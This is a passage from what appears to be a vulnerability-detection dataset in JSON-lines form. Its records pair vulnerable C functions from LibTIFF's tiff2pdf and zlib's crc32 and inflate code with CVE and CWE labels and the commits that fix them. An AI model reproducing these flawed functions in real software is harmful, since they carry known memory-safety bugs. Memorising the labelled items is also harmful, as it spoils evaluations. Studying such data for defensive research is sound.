(tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef ZIP_SUPPORT\n\t\tif(t2p->pdf_compression == T2P_COMPRESS_ZIP){\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tTIFFReadRawTile(input, tile, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\tif (t2p->tiff_fillorder==FILLORDER_LSB2MSB){\n\t\t\t\t\tTIFFReverseBits(buffer, t2p->tiff_datasize);\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, t2p->tiff_datasize);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(t2p->tiff_datasize);\n\t\t}\n#endif\n#ifdef OJPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_OJPEG){\n\t\t\tif(! t2p->pdf_ojpegdata){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"No support for OJPEG image %s with \"\n                                        \"bad tables\", \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tbuffer=(unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\t_TIFFmemcpy(buffer, t2p->pdf_ojpegdata, t2p->pdf_ojpegdatalength);\n\t\t\tif(edge!=0){\n\t\t\t\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[7]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength >> 8) & 0xff;\n\t\t\t\t\tbuffer[8]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength ) & 0xff;\n\t\t\t\t}\n\t\t\t\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile)){\n\t\t\t\t\tbuffer[9]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth >> 8) & 0xff;\n\t\t\t\t\tbuffer[10]=\n\t\t\t\t\t\t(t2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth ) & 0xff;\n\t\t\t\t}\n\t\t\t}\n\t\t\tbufferoffset=t2p->pdf_ojpegdatalength;\n\t\t\tbufferoffset+=TIFFReadRawTile(input, \n\t\t\t\t\ttile, \n\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t-1);\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xff;\n\t\t\t((unsigned char*)buffer)[bufferoffset++]=0xd9;\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n#ifdef JPEG_SUPPORT\n\t\tif(t2p->tiff_compression == COMPRESSION_JPEG){\n\t\t\tunsigned char table_end[2];\n\t\t\tuint32 count = 0;\n\t\t\tbuffer= (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate \" TIFF_SIZE_FORMAT \" bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n                                          (TIFF_SIZE_T) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n \t\t\t\treturn(0);\n \t\t\t}\n \t\t\tif(TIFFGetField(input, TIFFTAG_JPEGTABLES, &count, &jpt) != 0) {\n\t\t\t\tif (count >= 4) {\n                                         int retTIFFReadRawTile;\n                     /* Ignore EOI marker of JpegTables */\n \t\t\t\t\t_TIFFmemcpy(buffer, jpt, count - 2);\n\t\t\t\t\tbufferoffset += count - 2;\n                    /* Store last 2 bytes of the JpegTables */\n\t\t\t\t\ttable_end[0] = buffer[bufferoffset-2];\n\t\t\t\t\ttable_end[1] = buffer[bufferoffset-1];\n\t\t\t\t\txuint32 = bufferoffset;\n                                        bufferoffset -= 2;\n                                        retTIFFReadRawTile= TIFFReadRawTile(\n\t\t\t\t\t\tinput, \n\t\t\t\t\t\ttile, \n\t\t\t\t\t\t(tdata_t) &(((unsigned char*)buffer)[bufferoffset]), \n\t\t\t\t\t\t-1);\n                                        if( retTIFFReadRawTile < 0 )\n                                        {\n                                            _TIFFfree(buffer);\n                                            t2p->t2p_error = T2P_ERR_ERROR;\n                                            return(0);\n                                        }\n\t\t\t\t\tbufferoffset += retTIFFReadRawTile;\n                    /* Overwrite SOI marker of image scan with previously */\n                    /* saved end of JpegTables */\n\t\t\t\t\tbuffer[xuint32-2]=table_end[0];\n\t\t\t\t\tbuffer[xuint32-1]=table_end[1];\n\t\t\t\t}\n\t\t\t}\n\t\t\tt2pWriteFile(output, (tdata_t) buffer, bufferoffset);\n\t\t\t_TIFFfree(buffer);\n\t\t\treturn(bufferoffset);\n\t\t}\n#endif\n\t\t(void)0;\n\t}\n\n\tif(t2p->pdf_sample==T2P_SAMPLE_NOTHING){\n\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\tif(buffer==NULL){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Can't allocate %lu bytes of memory for \"\n                                \"t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\tTIFFFileName(input));\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tread = TIFFReadEncodedTile(\n\t\t\tinput, \n\t\t\ttile, \n\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\tt2p->tiff_datasize);\n\t\tif(read==-1){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\ttile, \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t} else {\n\n\t\tif(t2p->pdf_sample == T2P_SAMPLE_PLANAR_SEPARATE_TO_CONTIG){\n\t\t\tseptilesize=TIFFTileSize(input);\n\t\t\tseptilecount=TIFFNumberOfTiles(input);\n\t\t\t/* tilesize=septilesize*t2p->tiff_samplesperpixel; */\n\t\t\ttilecount=septilecount/t2p->tiff_samplesperpixel;\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(samplebuffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tsamplebufferoffset=0;\n\t\t\tfor(i=0;i<t2p->tiff_samplesperpixel;i++){\n\t\t\t\tread = \n\t\t\t\t\tTIFFReadEncodedTile(input, \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\t(tdata_t) &(samplebuffer[samplebufferoffset]), \n\t\t\t\t\t\tseptilesize);\n\t\t\t\tif(read==-1){\n\t\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\t\ttile + i*tilecount, \n\t\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t\t\t_TIFFfree(samplebuffer);\n\t\t\t\t\t\t_TIFFfree(buffer);\n\t\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\t\treturn(0);\n\t\t\t\t}\n\t\t\t\tsamplebufferoffset+=read;\n\t\t\t}\n\t\t\tt2p_sample_planar_separate_to_contig(\n\t\t\t\tt2p,\n\t\t\t\t&(buffer[bufferoffset]),\n\t\t\t\tsamplebuffer, \n\t\t\t\tsamplebufferoffset); \n\t\t\tbufferoffset+=samplebufferoffset;\n\t\t\t_TIFFfree(samplebuffer);\n\t\t}\n\n\t\tif(buffer==NULL){\n\t\t\tbuffer = (unsigned char*) _TIFFmalloc(t2p->tiff_datasize);\n\t\t\tif(buffer==NULL){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Can't allocate %lu bytes of memory \"\n                                        \"for t2p_readwrite_pdf_image_tile, %s\", \n\t\t\t\t\t(unsigned long) t2p->tiff_datasize, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t\tread = TIFFReadEncodedTile(\n\t\t\t\tinput, \n\t\t\t\ttile, \n\t\t\t\t(tdata_t) &buffer[bufferoffset], \n\t\t\t\tt2p->tiff_datasize);\n\t\t\tif(read==-1){\n\t\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\t\"Error on decoding tile %u of %s\", \n\t\t\t\t\ttile, \n\t\t\t\t\tTIFFFileName(input));\n\t\t\t\t_TIFFfree(buffer);\n\t\t\t\tt2p->t2p_error=T2P_ERR_ERROR;\n\t\t\t\treturn(0);\n\t\t\t}\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgba_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_RGBAA_TO_RGB){\n\t\t\tt2p->tiff_datasize=t2p_sample_rgbaa_to_rgb(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_YCBCR_TO_RGB){\n\t\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t\t\"No support for YCbCr to RGB in tile for %s\", \n\t\t\t\tTIFFFileName(input));\n\t\t\t_TIFFfree(buffer);\n\t\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\t\treturn(0);\n\t\t}\n\n\t\tif(t2p->pdf_sample & T2P_SAMPLE_LAB_SIGNED_TO_UNSIGNED){\n\t\t\tt2p->tiff_datasize=t2p_sample_lab_signed_to_unsigned(\n\t\t\t\t(tdata_t)buffer, \n\t\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth\n\t\t\t\t*t2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\t}\n\t}\n\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) != 0){\n\t\tt2p_tile_collapse_left(\n\t\t\tbuffer, \n\t\t\tTIFFTileRowSize(input),\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth,\n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t}\n\n\n\tt2p_disable(output);\n\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, t2p->tiff_photometric);\n\tTIFFSetField(output, TIFFTAG_BITSPERSAMPLE, t2p->tiff_bitspersample);\n\tTIFFSetField(output, TIFFTAG_SAMPLESPERPIXEL, t2p->tiff_samplesperpixel);\n\tif(t2p_tile_is_right_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilewidth);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGEWIDTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilewidth);\n\t}\n\tif(t2p_tile_is_bottom_edge(t2p->tiff_tiles[t2p->pdf_page], tile) == 0){\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_tilelength);\n\t} else {\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_IMAGELENGTH, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t\tTIFFSetField(\n\t\t\toutput, \n\t\t\tTIFFTAG_ROWSPERSTRIP, \n\t\t\tt2p->tiff_tiles[t2p->pdf_page].tiles_edgetilelength);\n\t}\n\tTIFFSetField(output, TIFFTAG_PLANARCONFIG, PLANARCONFIG_CONTIG);\n\tTIFFSetField(output, TIFFTAG_FILLORDER, FILLORDER_MSB2LSB);\n\n\tswitch(t2p->pdf_compression){\n\tcase T2P_COMPRESS_NONE:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_NONE);\n\t\tbreak;\n#ifdef CCITT_SUPPORT\n\tcase T2P_COMPRESS_G4:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_CCITTFAX4);\n\t\tbreak;\n#endif\n#ifdef JPEG_SUPPORT\n\tcase T2P_COMPRESS_JPEG:\n\t\tif (t2p->tiff_photometric==PHOTOMETRIC_YCBCR) {\n\t\t\tuint16 hor = 0, ver = 0;\n\t\t\tif (TIFFGetField(input, TIFFTAG_YCBCRSUBSAMPLING, &hor, &ver)!=0) {\n\t\t\t\tif (hor != 0 && ver != 0) {\n\t\t\t\t\tTIFFSetField(output, TIFFTAG_YCBCRSUBSAMPLING, hor, ver);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(TIFFGetField(input, TIFFTAG_REFERENCEBLACKWHITE, &xfloatp)!=0){\n\t\t\t\tTIFFSetField(output, TIFFTAG_REFERENCEBLACKWHITE, xfloatp);\n\t\t\t}\n\t\t}\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_JPEG);\n\t\tTIFFSetField(output, TIFFTAG_JPEGTABLESMODE, 0); /* JPEGTABLESMODE_NONE */\n\t\tif(t2p->pdf_colorspace & (T2P_CS_RGB | T2P_CS_LAB)){\n\t\t\tTIFFSetField(output, TIFFTAG_PHOTOMETRIC, PHOTOMETRIC_YCBCR);\n\t\t\tif(t2p->tiff_photometric != PHOTOMETRIC_YCBCR){\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RGB);\n\t\t\t} else {\n\t\t\t\tTIFFSetField(output, TIFFTAG_JPEGCOLORMODE, JPEGCOLORMODE_RAW);\n\t\t\t}\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_GRAY){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_colorspace & T2P_CS_CMYK){\n\t\t\t(void)0;\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_JPEGQUALITY, \n\t\t\t\tt2p->pdf_defaultcompressionquality);\n\t\t}\n\t\tbreak;\n#endif\n#ifdef ZIP_SUPPORT\n\tcase T2P_COMPRESS_ZIP:\n\t\tTIFFSetField(output, TIFFTAG_COMPRESSION, COMPRESSION_DEFLATE);\n\t\tif(t2p->pdf_defaultcompressionquality%100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_PREDICTOR, \n\t\t\t\tt2p->pdf_defaultcompressionquality % 100);\n\t\t}\n\t\tif(t2p->pdf_defaultcompressionquality/100 != 0){\n\t\t\tTIFFSetField(output, \n\t\t\t\tTIFFTAG_ZIPQUALITY, \n\t\t\t\t(t2p->pdf_defaultcompressionquality / 100));\n\t\t}\n\t\tbreak;\n#endif\n\tdefault:\n\t\tbreak;\n\t}\n\n\tt2p_enable(output);\n\tt2p->outputwritten = 0;\n\tbufferoffset = TIFFWriteEncodedStrip(output, (tstrip_t) 0, buffer,\n\t\t\t\t\t     TIFFStripSize(output)); \n\tif (buffer != NULL) {\n\t\t_TIFFfree(buffer);\n\t\tbuffer = NULL;\n\t}\n\tif (bufferoffset == -1) {\n\t\tTIFFError(TIFF2PDF_MODULE, \n\t\t\t  \"Error writing encoded tile to output PDF %s\", \n\t\t\t  TIFFFileName(output));\n\t\tt2p->t2p_error = T2P_ERR_ERROR;\n\t\treturn(0);\n\t}\n\t\n\twritten = t2p->outputwritten;\n\t\n\treturn(written);\n}\n", "func_hash": 189588000909003614757373229941765131806, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-10094", "cve_desc": "Off-by-one error in the t2p_readwrite_pdf_image_tile function in tools/tiff2pdf.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-10094"}
{"idx": 3241, "project": "zlib", "commit_id": "d1d577490c15a0c6862473d7576352a9f18ef811", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/d1d577490c15a0c6862473d7576352a9f18ef811", "commit_message": "Avoid pre-decrement of pointer in big-endian CRC calculation.\n\nThere was a small optimization for PowerPCs to pre-increment a\npointer when accessing a word, instead of post-incrementing. This\nrequired prefacing the loop with a decrement of the pointer,\npossibly pointing before the object passed. This is not compliant\nwith the C standard, for which decrementing a pointer before its\nallocated memory is undefined. When tested on a modern PowerPC\nwith a modern compiler, the optimization no longer has any effect.\nDue to all that, and per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.", "target": 1, "func": "local unsigned long crc32_big(crc, buf, len)\n    unsigned long crc;\n    const unsigned char FAR *buf;\n    unsigned len;\n{\n    register z_crc_t c;\n    register const z_crc_t FAR *buf4;\n\n    c = ZSWAP32((z_crc_t)crc);\n    c = ~c;\n    while (len && ((ptrdiff_t)buf & 3)) {\n        c = crc_table[4][(c >> 24) ^ *buf++] ^ (c << 8);\n        len--;\n     }\n \n     buf4 = (const z_crc_t FAR *)(const void FAR *)buf;\n    buf4--;\n     while (len >= 32) {\n         DOBIG32;\n         len -= 32;\n    }\n    while (len >= 4) {\n         DOBIG4;\n         len -= 4;\n     }\n    buf4++;\n     buf = (const unsigned char FAR *)buf4;\n \n     if (len) do {\n        c = crc_table[4][(c >> 24) ^ *buf++] ^ (c << 8);\n    } while (--len);\n    c = ~c;\n    return (unsigned long)(ZSWAP32(c));\n}\n", "func_hash": 72455579918499889262975502999434645943, "file_name": "crc32.c", "file_hash": 219879363491041882271834218685634942746, "cwe": ["CWE-189"], "cve": "CVE-2016-9843", "cve_desc": "The crc32_big function in crc32.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving big-endian CRC calculation.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9843"}
{"idx": 3242, "project": "zlib", "commit_id": "e54e1299404101a5a9d0cf5e45512b543967f958", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/e54e1299404101a5a9d0cf5e45512b543967f958", "commit_message": "Avoid shifts of negative values inflateMark().\n\nThe C standard says that bit shifts of negative integers is\nundefined.  This casts to unsigned values to assure a known\nresult.", "target": 1, "func": "long ZEXPORT inflateMark(strm)\nz_streamp strm;\n {\n     struct inflate_state FAR *state;\n \n    if (strm == Z_NULL || strm->state == Z_NULL) return -1L << 16;\n     state = (struct inflate_state FAR *)strm->state;\n    return ((long)(state->back) << 16) +\n         (state->mode == COPY ? state->length :\n             (state->mode == MATCH ? state->was - state->length : 0));\n }\n", "func_hash": 225690671182833494308266788501768726469, "file_name": "inflate.c", "file_hash": 143972972253035309721018825135499976770, "cwe": ["CWE-189"], "cve": "CVE-2016-9842", "cve_desc": "The inflateMark function in inflate.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving left shifts of negative integers.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9842"}
{"idx": 3243, "project": "zlib", "commit_id": "9aaec95e82117c1cb0f9624264c3618fc380cecb", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/9aaec95e82117c1cb0f9624264c3618fc380cecb", "commit_message": "Use post-increment only in inffast.c.\n\nAn old inffast.c optimization turns out to not be optimal anymore\nwith modern compilers, and furthermore was not compliant with the\nC standard, for which decrementing a pointer before its allocated\nmemory is undefined. Per the recommendation of a security audit of\nthe zlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this \"optimization\" was removed, in order to\navoid the possibility of undefined behavior.", "target": 1, "func": "void ZLIB_INTERNAL inflate_fast(strm, start)\nz_streamp strm;\nunsigned start;         /* inflate()'s starting value for strm->avail_out */\n{\n    struct inflate_state FAR *state;\n    z_const unsigned char FAR *in;      /* local strm->next_in */\n    z_const unsigned char FAR *last;    /* have enough input while in < last */\n    unsigned char FAR *out;     /* local strm->next_out */\n    unsigned char FAR *beg;     /* inflate()'s initial strm->next_out */\n    unsigned char FAR *end;     /* while out < end, enough space available */\n#ifdef INFLATE_STRICT\n    unsigned dmax;              /* maximum distance from zlib header */\n#endif\n    unsigned wsize;             /* window size or zero if not using window */\n    unsigned whave;             /* valid bytes in the window */\n    unsigned wnext;             /* window write index */\n    unsigned char FAR *window;  /* allocated sliding window, if wsize != 0 */\n    unsigned long hold;         /* local strm->hold */\n    unsigned bits;              /* local strm->bits */\n    code const FAR *lcode;      /* local strm->lencode */\n    code const FAR *dcode;      /* local strm->distcode */\n    unsigned lmask;             /* mask for first level of length codes */\n    unsigned dmask;             /* mask for first level of distance codes */\n    code here;                  /* retrieved table entry */\n    unsigned op;                /* code bits, operation, extra bits, or */\n                                /*  window position, window bytes to copy */\n    unsigned len;               /* match length, unused bytes */\n    unsigned dist;              /* match distance */\n    unsigned char FAR *from;    /* where to copy match from */\n \n     /* copy state to local variables */\n     state = (struct inflate_state FAR *)strm->state;\n    in = strm->next_in - OFF;\n     last = in + (strm->avail_in - 5);\n    out = strm->next_out - OFF;\n     beg = out - (start - strm->avail_out);\n     end = out + (strm->avail_out - 257);\n #ifdef INFLATE_STRICT\n    dmax = state->dmax;\n#endif\n    wsize = state->wsize;\n    whave = state->whave;\n    wnext = state->wnext;\n    window = state->window;\n    hold = state->hold;\n    bits = state->bits;\n    lcode = state->lencode;\n    dcode = state->distcode;\n    lmask = (1U << state->lenbits) - 1;\n    dmask = (1U << state->distbits) - 1;\n\n    /* decode literals and length/distances until end-of-block or not enough\n        input data or output space */\n     do {\n         if (bits < 15) {\n            hold += (unsigned long)(PUP(in)) << bits;\n             bits += 8;\n            hold += (unsigned long)(PUP(in)) << bits;\n             bits += 8;\n         }\n         here = lcode[hold & lmask];\n      dolen:\n        op = (unsigned)(here.bits);\n        hold >>= op;\n        bits -= op;\n        op = (unsigned)(here.op);\n        if (op == 0) {                          /* literal */\n             Tracevv((stderr, here.val >= 0x20 && here.val < 0x7f ?\n                     \"inflate:         literal '%c'\\n\" :\n                     \"inflate:         literal 0x%02x\\n\", here.val));\n            PUP(out) = (unsigned char)(here.val);\n         }\n         else if (op & 16) {                     /* length base */\n             len = (unsigned)(here.val);\n             op &= 15;                           /* number of extra bits */\n             if (op) {\n                 if (bits < op) {\n                    hold += (unsigned long)(PUP(in)) << bits;\n                     bits += 8;\n                 }\n                 len += (unsigned)hold & ((1U << op) - 1);\n                hold >>= op;\n                bits -= op;\n             }\n             Tracevv((stderr, \"inflate:         length %u\\n\", len));\n             if (bits < 15) {\n                hold += (unsigned long)(PUP(in)) << bits;\n                 bits += 8;\n                hold += (unsigned long)(PUP(in)) << bits;\n                 bits += 8;\n             }\n             here = dcode[hold & dmask];\n          dodist:\n            op = (unsigned)(here.bits);\n            hold >>= op;\n            bits -= op;\n            op = (unsigned)(here.op);\n            if (op & 16) {                      /* distance base */\n                 dist = (unsigned)(here.val);\n                 op &= 15;                       /* number of extra bits */\n                 if (bits < op) {\n                    hold += (unsigned long)(PUP(in)) << bits;\n                     bits += 8;\n                     if (bits < op) {\n                        hold += (unsigned long)(PUP(in)) << bits;\n                         bits += 8;\n                     }\n                 }\n                dist += (unsigned)hold & ((1U << op) - 1);\n#ifdef INFLATE_STRICT\n                if (dist > dmax) {\n                    strm->msg = (char *)\"invalid distance too far back\";\n                    state->mode = BAD;\n                    break;\n                }\n#endif\n                hold >>= op;\n                bits -= op;\n                Tracevv((stderr, \"inflate:         distance %u\\n\", dist));\n                op = (unsigned)(out - beg);     /* max distance in output */\n                if (dist > op) {                /* see if copy from window */\n                    op = dist - op;             /* distance back in window */\n                    if (op > whave) {\n                        if (state->sane) {\n                            strm->msg =\n                                (char *)\"invalid distance too far back\";\n                            state->mode = BAD;\n                            break;\n                        }\n #ifdef INFLATE_ALLOW_INVALID_DISTANCE_TOOFAR_ARRR\n                         if (len <= op - whave) {\n                             do {\n                                PUP(out) = 0;\n                             } while (--len);\n                             continue;\n                         }\n                         len -= op - whave;\n                         do {\n                            PUP(out) = 0;\n                         } while (--op > whave);\n                         if (op == 0) {\n                             from = out - dist;\n                             do {\n                                PUP(out) = PUP(from);\n                             } while (--len);\n                             continue;\n                         }\n #endif\n                     }\n                    from = window - OFF;\n                     if (wnext == 0) {           /* very common case */\n                         from += wsize - op;\n                         if (op < len) {         /* some from window */\n                             len -= op;\n                             do {\n                                PUP(out) = PUP(from);\n                             } while (--op);\n                             from = out - dist;  /* rest from output */\n                         }\n                    }\n                    else if (wnext < op) {      /* wrap around window */\n                        from += wsize + wnext - op;\n                        op -= wnext;\n                         if (op < len) {         /* some from end of window */\n                             len -= op;\n                             do {\n                                PUP(out) = PUP(from);\n                             } while (--op);\n                            from = window - OFF;\n                             if (wnext < len) {  /* some from start of window */\n                                 op = wnext;\n                                 len -= op;\n                                 do {\n                                    PUP(out) = PUP(from);\n                                 } while (--op);\n                                 from = out - dist;      /* rest from output */\n                             }\n                        }\n                    }\n                    else {                      /* contiguous in window */\n                        from += wnext - op;\n                         if (op < len) {         /* some from window */\n                             len -= op;\n                             do {\n                                PUP(out) = PUP(from);\n                             } while (--op);\n                             from = out - dist;  /* rest from output */\n                         }\n                     }\n                     while (len > 2) {\n                        PUP(out) = PUP(from);\n                        PUP(out) = PUP(from);\n                        PUP(out) = PUP(from);\n                         len -= 3;\n                     }\n                     if (len) {\n                        PUP(out) = PUP(from);\n                         if (len > 1)\n                            PUP(out) = PUP(from);\n                     }\n                 }\n                 else {\n                     from = out - dist;          /* copy direct from output */\n                     do {                        /* minimum length is three */\n                        PUP(out) = PUP(from);\n                        PUP(out) = PUP(from);\n                        PUP(out) = PUP(from);\n                         len -= 3;\n                     } while (len > 2);\n                     if (len) {\n                        PUP(out) = PUP(from);\n                         if (len > 1)\n                            PUP(out) = PUP(from);\n                     }\n                 }\n             }\n            else if ((op & 64) == 0) {          /* 2nd level distance code */\n                here = dcode[here.val + (hold & ((1U << op) - 1))];\n                goto dodist;\n            }\n            else {\n                strm->msg = (char *)\"invalid distance code\";\n                state->mode = BAD;\n                break;\n            }\n        }\n        else if ((op & 64) == 0) {              /* 2nd level length code */\n            here = lcode[here.val + (hold & ((1U << op) - 1))];\n            goto dolen;\n        }\n        else if (op & 32) {                     /* end-of-block */\n            Tracevv((stderr, \"inflate:         end of block\\n\"));\n            state->mode = TYPE;\n            break;\n        }\n        else {\n            strm->msg = (char *)\"invalid literal/length code\";\n            state->mode = BAD;\n            break;\n        }\n    } while (in < last && out < end);\n\n    /* return unused bytes (on entry, bits < 8, so in won't go too far back) */\n    len = bits >> 3;\n    in -= len;\n    bits -= len << 3;\n     hold &= (1U << bits) - 1;\n \n     /* update state and return */\n    strm->next_in = in + OFF;\n    strm->next_out = out + 